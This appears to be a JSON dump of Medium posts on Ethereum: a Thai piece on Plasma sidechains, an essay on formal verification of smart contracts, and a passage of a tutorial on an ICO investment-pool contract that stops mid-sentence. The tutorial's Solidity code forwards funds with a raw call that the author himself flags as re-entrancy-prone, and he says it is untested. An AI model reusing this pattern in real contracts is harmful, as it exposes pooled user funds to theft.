\u0e0b\u0e36\u0e48\u0e07\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e02\u0e32\u0e22\u0e02\u0e2d\u0e07\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e1a\u0e19 Ethereum \u0e2d\u0e22\u0e48\u0e32\u0e07\u0e43\u0e19\u0e23\u0e39\u0e1b\u0e1c\u0e39\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e01\u0e14\u0e0b\u0e37\u0e49\u0e2d\u0e41\u0e21\u0e27\u0e08\u0e32\u0e01 CryptoKitties \u0e43\u0e19\u0e23\u0e32\u0e04\u0e32 0.005845 Ether \u0e41\u0e25\u0e30\u0e04\u0e48\u0e32 Gas Fee \u0e2d\u0e35\u0e01 0.000635\u0e19\u0e2d\u0e01\u0e08\u0e32\u0e01\u0e19\u0e35\u0e49\u0e41\u0e25\u0e49\u0e27 User \u0e22\u0e31\u0e07\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e01\u0e33\u0e2b\u0e19\u0e14 Gas Limit \u0e2b\u0e23\u0e37\u0e2d\u0e1b\u0e23\u0e34\u0e21\u0e32\u0e13 Gas \u0e17\u0e35\u0e48\u0e22\u0e2d\u0e21\u0e40\u0e2a\u0e35\u0e22\u0e44\u0e14\u0e49\u0e21\u0e32\u0e01\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e43\u0e19\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2d\u0e35\u0e01\u0e14\u0e49\u0e27\u0e22\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07 \u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35\u0e04\u0e19\u0e2a\u0e31\u0e48\u0e07 \u0e41\u0e25\u0e30\u0e04\u0e19\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22\u0e04\u0e48\u0e32 Gas \u0e19\u0e31\u0e48\u0e19\u0e41\u0e1b\u0e25\u0e27\u0e48\u0e32 Smart Contract \u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e17\u0e33\u0e07\u0e32\u0e19\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34 \u0e1c\u0e39\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e21\u0e2d\u0e07\u0e27\u0e48\u0e32\u0e21\u0e31\u0e19\u0e40\u0e1b\u0e47\u0e19\u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19 Database Schema \u0e21\u0e32\u0e01\u0e01\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19 Application\u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e17\u0e33\u0e43\u0e2b\u0e49 Smart Contract \u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34\u0e01\u0e47\u0e44\u0e14\u0e49\u0e41\u0e15\u0e48\u0e19\u0e31\u0e48\u0e19\u0e08\u0e30\u0e40\u0e1b\u0e47\u0e19\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e08\u0e32\u0e01\u0e20\u0e32\u0e22\u0e19\u0e2d\u0e01 \u0e42\u0e14\u0e22\u0e2d\u0e32\u0e08\u0e08\u0e30\u0e43\u0e2b\u0e49 Bot \u0e2b\u0e23\u0e37\u0e2d Cron \u0e15\u0e31\u0e27\u0e2b\u0e19\u0e36\u0e48\u0e07\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07 Private Key \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Smart Contract \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e15\u0e48\u0e2d\u0e22\u0e48\u0e32\u0e25\u0e37\u0e21\u0e27\u0e48\u0e32\u0e01\u0e32\u0e23\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22\u0e04\u0e48\u0e32 Gas \u0e40\u0e2a\u0e21\u0e2d\u0e01\u0e32\u0e23\u0e17\u0e33 Smart Contract \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e01\u0e47\u0e1a\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e21\u0e32\u0e01 \u0e46 \u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22\u0e04\u0e48\u0e32 Gas \u0e08\u0e33\u0e19\u0e27\u0e19\u0e21\u0e32\u0e01 \u0e41\u0e25\u0e30\u0e23\u0e27\u0e21\u0e44\u0e1b\u0e16\u0e36\u0e07\u0e04\u0e27\u0e32\u0e21\u0e0a\u0e49\u0e32 (~15 \u0e27\u0e34\u0e19\u0e32\u0e17\u0e35 \u0e15\u0e48\u0e2d 1 Block) \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e01\u0e34\u0e14\u0e01\u0e32\u0e23\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e43\u0e2b\u0e21\u0e48 \u0e46 \u0e1a\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49 Sidechain \u0e41\u0e1a\u0e1a Plasma \u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e17\u0e14\u0e41\u0e17\u0e19\u0e01\u0e32\u0e23\u0e17\u0e33\u0e07\u0e32\u0e19\u0e17\u0e35\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e04\u0e27\u0e32\u0e21\u0e40\u0e23\u0e47\u0e27\u0e2b\u0e23\u0e37\u0e2d\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e17\u0e33\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e1a\u0e48\u0e2d\u0e22 \u0e46 \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e01\u0e25\u0e48\u0e32\u0e27\u0e16\u0e36\u0e07\u0e43\u0e19\u0e1a\u0e17\u0e16\u0e31\u0e14 \u0e46 \u0e44\u0e1b\u0e40\u0e01\u0e21 Zombie Battleground (\u0e2b\u0e23\u0e37\u0e2d\u0e43\u0e19\u0e0a\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e21\u0e48\u0e04\u0e37\u0e2d Relentless)\u0e22\u0e01\u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07 \u0e01\u0e32\u0e23\u0e08\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e01\u0e21\u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e01\u0e47\u0e21\u0e35\u0e02\u0e49\u0e2d\u0e14\u0e35\u0e2d\u0e22\u0e39\u0e48\u0e21\u0e32\u0e01\u0e40\u0e0a\u0e48\u0e19\u0e1c\u0e39\u0e49\u0e40\u0e25\u0e48\u0e19\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e01\u0e47\u0e1a\u0e2a\u0e30\u0e2a\u0e21\u0e02\u0e2d\u0e07\u0e17\u0e35\u0e48\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e21\u0e35\u0e44\u0e27\u0e49\u0e44\u0e14\u0e49\u0e15\u0e25\u0e2d\u0e14\u0e01\u0e32\u0e25\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e25\u0e31\u0e27\u0e40\u0e0b\u0e34\u0e1f\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e25\u0e48\u0e21 \u0e41\u0e15\u0e48\u0e01\u0e32\u0e23\u0e08\u0e30\u0e40\u0e25\u0e48\u0e19\u0e40\u0e01\u0e21\u0e1a\u0e19 Ethereum Mainnet \u0e17\u0e35\u0e48\u0e21\u0e35 Block Interval \u0e17\u0e35\u0e48 15 \u0e27\u0e34\u0e19\u0e32\u0e17\u0e35\u0e19\u0e31\u0e49\u0e19\u0e21\u0e31\u0e19\u0e19\u0e32\u0e19\u0e40\u0e01\u0e34\u0e19\u0e44\u0e1b (\u0e15\u0e49\u0e2d\u0e07\u0e23\u0e2d 15 \u0e27\u0e34\u0e19\u0e32\u0e17\u0e35\u0e01\u0e48\u0e2d\u0e19\u0e17\u0e33 Action \u0e41\u0e15\u0e48\u0e25\u0e30\u0e04\u0e23\u0e31\u0e49\u0e07) \u0e17\u0e35\u0e21\u0e07\u0e32\u0e19 Loom Network \u0e08\u0e36\u0e07\u0e44\u0e14\u0e49\u0e2a\u0e23\u0e49\u0e32\u0e07 ZombieChain ( \u0e2b\u0e23\u0e37\u0e2d\u0e43\u0e19\u0e0a\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e21\u0e48\u0e04\u0e37\u0e2d PlasmaChain) \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Sidechain \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e23\u0e2d\u0e07\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e17\u0e33\u0e07\u0e32\u0e19\u0e17\u0e35\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e04\u0e27\u0e32\u0e21\u0e23\u0e27\u0e14\u0e40\u0e23\u0e47\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e40\u0e0a\u0e48\u0e19 \u0e40\u0e01\u0e21\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e2b\u0e23\u0e37\u0e2d\u0e08\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07 Social Network \u0e01\u0e47\u0e22\u0e31\u0e07\u0e44\u0e14\u0e49\u0e02\u0e49\u0e2d\u0e14\u0e35\u0e2d\u0e35\u0e01\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e02\u0e2d\u0e07 Plasma \u0e04\u0e37\u0e2d User \u0e22\u0e31\u0e07\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 Redeem \u0e2a\u0e34\u0e48\u0e07\u0e02\u0e2d\u0e07\u0e2b\u0e23\u0e37\u0e2d Token \u0e01\u0e25\u0e31\u0e1a\u0e44\u0e1b\u0e17\u0e35\u0e48 Ethereum Mainnet \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e02\u0e36\u0e49\u0e19\u0e2d\u0e22\u0e39\u0e48\u0e01\u0e31\u0e1a Operator \u0e19\u0e2d\u0e01\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e41\u0e25\u0e49\u0e27 User \u0e22\u0e31\u0e07\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22\u0e04\u0e48\u0e32 Gas \u0e21\u0e2b\u0e32\u0e28\u0e32\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e1a\u0e19 Smart ContractPlasmagroup \u0e0b\u0e36\u0e48\u0e07\u0e2a\u0e23\u0e49\u0e32\u0e07 Plasma-chain CLI \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e19\u0e31\u0e01\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e23\u0e49\u0e32\u0e07 Plasma-chain \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e44\u0e14\u0e49\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01 Plasma \u0e22\u0e31\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e40\u0e17\u0e04\u0e42\u0e19\u0e42\u0e25\u0e22\u0e35\u0e17\u0e35\u0e48\u0e22\u0e31\u0e07\u0e04\u0e49\u0e19\u0e04\u0e27\u0e49\u0e32\u0e01\u0e31\u0e19\u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e30\u0e21\u0e35\u0e17\u0e35\u0e21\u0e07\u0e32\u0e19\u0e08\u0e32\u0e01\u0e2b\u0e25\u0e32\u0e22\u0e17\u0e35\u0e48\u0e41\u0e22\u0e01\u0e01\u0e31\u0e19\u0e17\u0e33 \u0e17\u0e31\u0e49\u0e07\u0e19\u0e35\u0e49\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e17\u0e35\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e17\u0e33 Sidechain \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e44\u0e1b\u0e40\u0e25\u0e37\u0e2d\u0e01\u0e01\u0e31\u0e19\u0e40\u0e2d\u0e07\u0e27\u0e48\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e40\u0e08\u0e49\u0e32\u0e44\u0e2b\u0e19 \u0e2b\u0e23\u0e37\u0e2d\u0e08\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19 Plasma \u0e40\u0e2d\u0e07\u0e01\u0e47\u0e22\u0e31\u0e07\u0e44\u0e14\u0e49 \u0e22\u0e01\u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e17\u0e35\u0e48\u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e2a\u0e23\u0e49\u0e32\u0e07 Plasma Chain \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e07\u0e48\u0e32\u0e22 \u0e46 \u0e40\u0e0a\u0e48\u0e19 PlasmaGroup, Loom Network \u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e19 \u0e0b\u0e36\u0e48\u0e07\u0e1c\u0e39\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e08\u0e30\u0e1e\u0e32\u0e40\u0e08\u0e32\u0e30\u0e25\u0e36\u0e01\u0e43\u0e19\u0e25\u0e33\u0e14\u0e31\u0e1a\u0e16\u0e31\u0e14\u0e44\u0e1b\u0e43\u0e04\u0e23\u0e2d\u0e22\u0e32\u0e01\u0e1e\u0e39\u0e14\u0e04\u0e38\u0e22\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a\u0e40\u0e17\u0e04\u0e42\u0e19\u0e42\u0e25\u0e22\u0e35 Plasma \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e01\u0e25\u0e38\u0e48\u0e21\u0e1a\u0e19 Facebook \u0e44\u0e14\u0e49\u0e17\u0e35\u0e48https://www.facebook.com/groups/415118605919440/", "responses": 0, "tags": ["Ethereum", "Smart Contract", "Solidity", "Web3", "Blockchain"]}, {"title": "Formal Verification, Virtual Hardware, and Engineering for Blockchains", "post_link": "https://medium.com/balance-io/formal-verification-virtual-hardware-and-engineering-for-blockchains-51d07abdc934?source=search_post", "author_name": "Richard Burton", "author_link": "https://medium.com/@ricburton", "publish_date": "2019-03-28", "last_modified_date": "2019-03-29", "readtime": "4.51", "claps": 801, "voters": 40, "content": "Formal Verification, Virtual Hardware, and Engineering for BlockchainsHow high-assurance software development will push open source economic infrastructure forward and help build up trustRichard BurtonFollowMar 28 \u00b7 5 min readLev from DappHub casually Unplugging from the Fiat MatrixOver the last few months, I have been trying to learn as much as I can about the MakerDAO protocol, the people who created it, and why it has been so successful. I have been reading through thousands of Reddit posts, tweets, Medium articles and Git commits. I have been traveling the world to meet as many of the team as possible and learn about why they are the way they are. It has been a really interesting trip down a totally new rabbit hole. At the bottom of this warren I found two fascinating Jedi called Lev and Martin. They have been kind enough to share what they have learnt about building a set of smart contracts that currently contain around $300 million in collateral.Smart contract engineering is very different from other kinds of software development. When you publish your code to Ethereum, anyone can interact with it. This is a double-edged sword. On the positive side, it means that anyone can build on top of your infrastructure. On the negative side, it means that lots of people will try to attack your code and find bugs. It requires a totally different mentality when it comes to engineering and shipping.It turns out that other industries have similar requirements. If you are writing code for rockets, airplanes or medical devices, you do not ship untested software rapidly. You architect a solution and build it out carefully, testing everything as you go. This requirement for incredibly high quality code has led researchers and engineers to the practice of Formal Verification.\u201cFormal verification is the act of proving or disproving the correctness of intended algorithms underlying a system with respect to a certain formal specification or property, using formal methods of mathematics.\u201dCrafting Virtual HardwareWhen Apple releases a new iPhone, it is the culmination of decades of manufacturing expertise and factory design. They spend an enormous amount of time designing the machines that make the objects. Jony Ive has spoke about this endeavor multiple times: Apple spends an insane amount of time making things to make things. Their factory tooling is as important as the final product itself. If they did not invest in their tools, they could could not ship the iPhone to millions of customers every year.Jony\u2019s obsession with factory design.Andy Milenius, the CTO of MakerDAO, coined this wonderful phrase for smart contracts. He called them \u201cvirtual hardware\u201d on the a16z podcast.a16z Podcast: All about StablecoinsThe history, evolution, and use of money revolves around the important concept of debt: It's what allows us to \"time\u2026a16z.comI think this description really captures the rigor and intensity required to make software that cannot be hacked and will perform as expected. Both Apple and Maker have invested huge amounts of resources in their tools. It pays off over time.Engineering for BlockchainsThe team at DappHub have been working on a set of tools to help smart contract engineers write high quality software for these public and programmable protocols. As an outsider with very little engineering experience, it strikes me that this kind of work requires a mindset shift as well as a new set of practices. The teams building these kinds of contracts encourage people to specify the goals of the code clearly before you leap into the engineering. This seems to go way beyond test driven development and into the realm of total perfectionism.How can we formally verify that our code is correct?How can we be sure that everyone\u2019s money will be safe in this extremely adversarial network filled with hackers?How can we sleep at night knowing we have done everything possible to look after the people who trusted our code?These are the questions that go flying around my head when I think about how to build systems for blockchains. We have seen so many huge hacks result in so much lost capital.The people behind the K Framework have been trying to figure out better ways to tell computers what to do for some time. This is from their overview blog post:\u201cUnlike natural language, which allows interpretation and miscommunication, programming languages are meant to tell computers precisely what to do. Without a rigorous definition of a programming language that unambiguously says what each program does, also called a formal semantics, it is impossible to guarantee reliable, safe or secure operation of computing systems. K is a framework that allows you to define, or implement, the formal semantics of your programming language in an intuitive and modular way. Once you do that, K offers you a suite of tools for your language, including both an executable model and a program verifier.\u201dDappHub have been working on a suite of tools called klab, which makes it easier to use the K Framework to specify and formally verify smart contracts.This allows engineers to step through their Solidity code, look at the byte code it generates for Ethereum, and compare it their original specifications. These tools strike me as debuggers for thought. You are constantly checking what something is doing and what you think it is doing.It took us several hours to walk through the specification of a simple ERC-20 token.Lev was kind enough to hold a workshop on all of this and shared a bunch of resources with everyone. If you are curious to learn more, start here:Engineering TrustEthereum gave us the first trustworthy and global computer. Today, it is extremely slow, very hard to use, and monstrously expensive. However, technology is always good at changing those things. It will speed up, it will get easier to use, and it will get cheaper. The unique quality that Ethereum has is its trustworthiness. Anyone can verify that any piece of code did what it supposed to. That is what blockchains are really useful for. Public, programmable and verifiable computation.In the world of trustworthy computational networks, we need more trustworthy engineering. MakerDAO is built on Ethereum and generates Dai\u2014a stablecoin which tracks the dollar. Thousands of projects are built on top of Dai. Millions of people will use those applications. Every person is trusting that the system beneath them is going to operate correctly.It is trust all the way down.", "responses": 3, "tags": ["Blockchain", "Ethereum", "Smart Contracts", "Formal Verification", "Solidity"]}, {"title": "Hacking a Popular ICO Practice That Only Rewards the Richer", "post_link": "https://medium.com/hackernoon/hacking-a-popular-ico-practice-that-only-rewards-the-richer-7d10b2019f1e?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2017-11-27", "last_modified_date": "2019-05-13", "readtime": "11.9", "claps": 171, "voters": 36, "content": "Hacking a Popular ICO Practice That Only Rewards the RicherPablo RuizFollowNov 27, 2017 \u00b7 12 min readIf you have been part of the Ethereum / Cryptocurrency ecosystem for at least a few months, you might be aware of the ICO craze going around.There\u2019s literally dozens of ICOs / Token Sales springing out every day as can be seen on popular platforms \u2014 like IcoAlert or TokenMarket\u2014 tracking ICO activity.One of the most common practices used by ICO teams to promote and incentivize their token sales is to offer hefty discounts or bonuses to contributors based on when they buy into their tokens or how much they are willing to invest.Why should the rich get richer?Recently, there\u2019s been some hot debate whether or not it\u2019s ok for ICOs to offer bonuses based on volume purchased / money spent.Detractors of this practice argue that it goes against the spirit of Ethereum \u2014 And crypto in general \u2014 to reward people with more resources to gain an advantage over other people with less resources.Accessing Volume Discounts by Resource PoolingVolume-based bonuses won\u2019t be going away anytime soon. So\u2026 How can we take advantage of these bonuses if we can\u2019t (or won\u2019t) commit the minimum ether the ICO team is asking for?One of the ways to do this would be to find a few friends that are also interested in contributing to a particular ICO and have them send their ether to one of the members of the group, have him buy the tokens and then distribute the acquired tokens accordingly among this group of friends.Love, Faith and Hope. These are much needed when investing together with friends. (Photo by Jonathan Brinkhorst on Unsplash)In theory, this approach is pretty easy and straightforward, but in practice, it can become problematic. For one, you would have to trust this person receiving everyone\u2019s ether to come through, which already is a risky proposition. What if this person disappears with the money? What if he forgets his private key? What if his private key gets stolen? What if he makes a mistake and sends the money to an incorrect address? There\u2019s so many things that could go wrong.Also, what if we don\u2019t have enough friends that are interested in investing with you in a particular ICO? You might still want to do it and pool the money with complete strangers. There are a few sites and forums where people can find other people to invest together, but this presents a huge risk for everyone involved. I wouldn\u2019t send money blindly to someone I don\u2019t know extremely well, and neither should you.So, how can we collaboratively invest on an ICO without having to trust anyone else with our money? With a smart contract, of course! \ud83d\udcc4Building an Investment Pool Smart ContractIn the following paragraphs I\u2019m going to describe how to build a smart contract that allows several contributors to send money to it; have it invest in the selected ICO when some pre-conditions are met; and finally have it distribute the tokens purchased on a pro-rata basis.This smart contract would act as an intermediary that collects the money from several accounts and then forwards the collected funds to an ICO contract in one transaction in order to gain access to the volume-based bonus offered by the team.The tokens would then be bought by the contract, which allows the contributors that participated in the investment pool to withdraw them to their own accounts.Let\u2019s take a look at the smart contract that allows all this.But first, a few disclaimers, warnings and considerations:Before using the following contract to create an investment pool for an ICO you should make sure said ICO will allow you to later withdraw the tokens. Some ICOs don\u2019t use an smart contract while collecting contributions for example. Some ICOs also have whitelist mechanisms in place and KYC steps that need to be completed that might prevent a contract from investing on behalf of a physical person.The ICOPool contract has no way to know the details of the ICO it is targeting since there is no standard protocol to crowdsale contracts. This means that, for example, it doesn\u2019t know if there\u2019s a deadline for the bonus or what\u2019s the minimum / maximum contribution amounts, or if the ICO has already finished, etc. So, the contract relies on its admin to properly configure it and trigger the token purchase at the right moment.The ICOPool contract ends up participating in the ICO by making an external call to the crowdsale contract, executing its fallback function. Most crowdsale contracts are prepared to execute a buyTokens function(or a function with a similar name) upon receiving ether without any other data. You should make sure the ICO you do the investment pool for works this way.It goes without saying that the tokens being bought must be ERC20 compliant. If they are not, you won\u2019t be able to guarantee that the tokens can be transferred from the investment pool to the contributors.The following code has not been tested yet in a real-life project. Use it under your own risk, I\u2019m not to be held responsible for its improper use. Also, make sure the ICO you choose for the investment pool is not a scam. Using this contract has the same risks as if you would invest in the ICO by sending ether to it, this contract adds no additional security mechanisms. Proceed with extreme caution.The ICOPool Smart ContractYou can find the complete source code in my Github repository. Please take a look at the README.md file for further usage instructions, more in-depth information and examples.The ICOPool contract has 4 parts to it:Configuring the investment pool.Receiving ether from contributors to form the pool.Investing in the target ICO once the pool\u2019s requirements have been met.Allowing the contributors to obtain the acquired tokens.Configuring the investment poolIn order to put an investment pool in place, first we have to deploy the contract with a few parameters. The account deploying the ICOPool contract will become its admin. The admin\u2019s only purpose is to execute the function that buys into the ICO.Here\u2019s the code involved in the creation of the investment pool.function ICOPool(address _targetICO,                    uint _minContribution,                    uint _maxContribution,                    uint _poolSoftCap,                    uint _poolHardCap,                    uint _contributorsSoftCap,                    uint _contributorsHardCap                    ) public {                                require (_targetICO != address(0));        require (_minContribution > 0);        require (_maxContribution > _minContribution);        require (_poolHardCap > _poolSoftCap);        require (_contributorsSoftCap > 1);        require (_contributorsHardCap >= _contributorsSoftCap);                // Max people * their minimum contribution should be able to meet pool softcap        // For example, we can't allow having the max contributors (10 people) put $100 each when the softcap is $1500.        require(_contributorsHardCap * _minContribution >= _poolSoftCap);        // Min people * their maximum contribution should be within pool hardcap        // For example, we can't allow 3 people to reach the hardcap if the minimum contributors is 5        require(_contributorsSoftCap * _maxContribution <= _poolHardCap);                targetICO = _targetICO;        poolAdmin = msg.sender;        minContribution = _minContribution;        maxContribution = _maxContribution;                poolSoftCap = _poolSoftCap;        poolHardCap = _poolHardCap;                contributorsSoftCap = _contributorsSoftCap;        contributorsHardCap = _contributorsHardCap;    }The contract receives quite a few constructor parameters:address _targetICO: This is the ICO the investment pool will contribute its funds to. Anyone using this contract should double check this variable is pointing to the ICO the organizer says it does.uint _minContribution & uint _maxContribution: These are the minimum and maximum amount of ether (expressed in wei) that the contributor to the investment pool can put into the pool.uint _poolSoftCap & uint _poolHardCap: These are the minimum and maximum amount of ether (expressed in wei) that the investment pool allows in order to be able to invest in the target ICO. The soft cap must be reached before the admin can buy the tokens from the ICO. And no contributions may be accepted once the hard cap is reached.uint _contributorsSoftCap & uint _contributorsHardCap: These are the minimum and maximum amount of contributors the investment pool may accept.Notice there\u2019s a complex relationship between all these parameters so we don\u2019t risk the chance of the investment pool getting stuck:The soft cap (_poolSoftCap) should be lower than the max amount of contributors (_contributorsHardCap) multiplied by their minimum possible contribution (_minContribution). This way, it is not possible for the ICOPool to reach full capacity in terms of people but not reach the minimum ether goal. (If 10 people is the maximum number of contributors allowed, they should not be able to only invest 1 eth each, if the soft cap is greater than 10 eth).Along the same lines, the hard cap should be higher than the minimum amount of contributors multiplied by their maximum possible contribution. This way, it is not possible for the ICOPool to reach full capacity in terms of ether but not reach the minimum people required. (2 people should not be allowed to reach the pool\u2019s hard cap if the minimum people was 3 or more).It\u2019s also extremely important to notice that the ICOPool contract has no way to know what the minimum contribution is in order to trigger the bonuses. It\u2019s up to the admin to correctly set the soft and hard caps accordingly.Receiving ether from contributorsOnce the investment pool is set up, the person who created the contract can start promoting it among other people to pool contributions.Sending ether to the investment pool is done the same way as one would with a crowdsale. Just transfer the ether to the given address and the contract will take care of it.*It\u2019s worth mentioning that the contributor should take the same measures he takes when investing directly on the crowdsale. For example, they must send the money from an account they own the private key of.Here\u2019s the code that gets executed when someone sends money from their account.function() payable public {        require(msg.value > 0);        require(msg.value >= minContribution && msg.value <= maxContribution); // Must send eth within min and max contributions        require(contributorsBalance[msg.sender].add(msg.value) <= maxContribution); // msg.sender's balance can't exceed max contribution limit                // Pool can't exceed hard cap        require(poolBalance.add(msg.value) <= poolHardCap);                //Register how much eth the pool has        poolBalance = poolBalance.add(msg.value);                //If it is the first time this account contributes, increase num. of contributors        if (contributorsBalance[msg.sender] == 0){            amountOfContributors++;        }        // Pool can't exceed contributors hard cap        require(amountOfContributors <= contributorsHardCap);                //Register how much eth has each contributor put into the pool        contributorsBalance[msg.sender] = contributorsBalance[msg.sender].add(msg.value);    }First, we make sure that the contribution being made is within the boundaries the admin defined and that the people/money hard cap is not exceeded.If the contribution is accepted, we add the money sent to the contributor\u2019s balance. The contributor doesn\u2019t have to put all the money in one go, but each contribution should meet the minimum set by the admin.Investing in the target ICOAt any point in time \u2014 as long as the minimum requirements are met \u2014 , the admin may decide to stop collecting funds and make the purchase of the tokens from the ICO.Once he does, the investment pool contract may no longer accept incoming transfers of ether.As I mentioned before, this step must be performed by the admin, although the contract could be modified to allow any of the contributors to do it. This other approach makes the contract less dependent on one person, but it also makes it more messy and prone to problems. The main issue with allowing anyone to buy the tokens has to do with the fact that this ICOPool contract has no way to know the inner workings of the target ICO. In order to avoid conflict, the admin is the one that decides when to buy the tokens, and responsible for it. For example, the contract has no way to check if the volume bonus promoted by the ICO team is active at the moment, so it\u2019s up to the pool admin to check that and move forward with the token purchase. \u2014 Or not doing anything so the contributors can withdraw their funds \u2014 .function buyTokensFromICO() public {        require(!investedInICO);        require(poolBalance >= poolSoftCap);        require(amountOfContributors >= contributorsSoftCap);        require(this.balance >= poolBalance);                //Can be called only by the pool admin to avoid timing problems        // We'll need to trust the admin to execute this at the right moment        // Could be changed to allow any contributor to call it.        require(msg.sender == poolAdmin);                investedInICO = true;                // BE CAREFUL, OPENING RE-ENTRANCY DOOR        require(targetICO.call.value(poolBalance)());                // **************        //If you are hesitant about using call() you can instead instantiate        //the target ICO and directly use whatever function it has to buy tokens        // ------        //Crowdsale c = Crowdsale(targetICO);        //c.buyTokens.value(poolBalance)();        // **************    }Sending the funds to the target ICO is pretty straightforward. Once we have checked that the soft caps have been met, we proceed to forward the ether to the target ICO. Using the call() function and sending the pool balance along will trigger the ICO\u2019s fallback function.Once thing the admin (and contributors) should do before investing in the pool is making sure the pool will indeed be able to invest in the target ICO. This contract assumes the ICO has a fallback function that triggers the contract\u2019s own buyTokens (or whatever it is called) function.If the target ICO doesn\u2019t have a fallback function implemented or you feel insecure about using the call() function to 